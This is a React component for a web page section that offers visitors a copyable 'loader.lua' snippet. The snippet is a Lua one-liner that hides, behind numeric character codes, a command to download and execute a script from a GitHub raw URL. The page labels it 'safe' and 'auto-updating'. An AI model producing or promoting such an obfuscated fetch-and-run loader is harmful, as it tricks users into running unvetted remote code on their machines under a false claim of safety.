import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { Copy, Check, Terminal } from 'lucide-react';

export const ScriptSection = () => {
  const [copied, setCopied] = useState(false);
  const scriptCode = `loadstring(utf8.char((function() return table.unpack({ 108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,68,67,76,90,72,49,47,77,97,105,110,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,75,101,121,83,121,115,116,101,109,46,108,117,97,34,41,41,40,41 }) end)()))()`;

  const handleCopy = () => {
    navigator.clipboard.writeText(scriptCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <section id="script" className="py-24 relative overflow-hidden">
      {/* Background accents */}
      <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full max-w-3xl h-[400px] bg-violet-600/10 blur-[100px] rounded-full pointer-events-none" />

      <div className="container mx-auto px-6 relative z-10">
        <div className="max-w-3xl mx-auto text-center mb-10">
          <h2 className="text-3xl md:text-4xl font-bold mb-4"></h2>
          <p className="text-slate-400">
          </p>
        </div>

        <motion.div 
          initial={{ y: 20, opacity: 0 }}
          whileInView={{ y: 0, opacity: 1 }}
          viewport={{ once: true }}
          className="max-w-2xl mx-auto"
        >
          <div className="rounded-xl overflow-hidden bg-[#0d1117] border border-white/10 shadow-2xl shadow-violet-900/20">
            <div className="flex items-center justify-between px-4 py-3 bg-[#161b22] border-b border-white/5">
              <div className="flex items-center gap-2">
                <div className="flex gap-1.5">
                  <div className="w-3 h-3 rounded-full bg-red-500/50" />
                  <div className="w-3 h-3 rounded-full bg-yellow-500/50" />
                  <div className="w-3 h-3 rounded-full bg-green-500/50" />
                </div>
                <span className="ml-3 text-xs text-slate-500 font-mono">loader.lua</span>
              </div>
              <button
                onClick={handleCopy}
                className="flex items-center gap-2 text-xs font-medium text-slate-400 hover:text-white transition-colors"
              >
                {copied ? (
                  <>
                    <Check className="w-3.5 h-3.5 text-green-400" />
                    <span className="text-green-400">Copied!</span>
                  </>
                ) : (
                  <>
                    <Copy className="w-3.5 h-3.5" />
                    <span>Copy Code</span>
                  </>
                )}
              </button>
            </div>
            
            <div className="p-6 overflow-x-auto">
              <pre className="font-mono text-sm text-slate-300">
                <code>
                  <span className="text-violet-400">loadstring</span>
                  <span className="text-slate-400">(</span>
                  <span className="text-cyan-400">utf8.char</span>
                  <span className="text-slate-400">((</span>
                  <span className="text-yellow-400">function()</span>
                  <span className="text-slate-400">return table.unpack({"108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,68,67,76,90,72,49,47,77,97,105,110,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,75,101,121,83,121,115,116,101,109,46,108,117,97,34,41,41,40,41"}</span>
                  <span className="text-slate-400">) end)()))()</span>
                </code>
              </pre>
            </div>
          </div>

          <div className="mt-6 flex justify-center gap-6 text-sm text-slate-500">
             <div className="flex items-center gap-2">
               <Terminal className="w-4 h-4" />
               <span>自动更新</span>
             </div>
             <div className="flex items-center gap-2">
               <Check className="w-4 h-4" />
               <span>安全</span>
             </div>
          </div>
        </motion.div>
      </div>
    </section>
  );
};
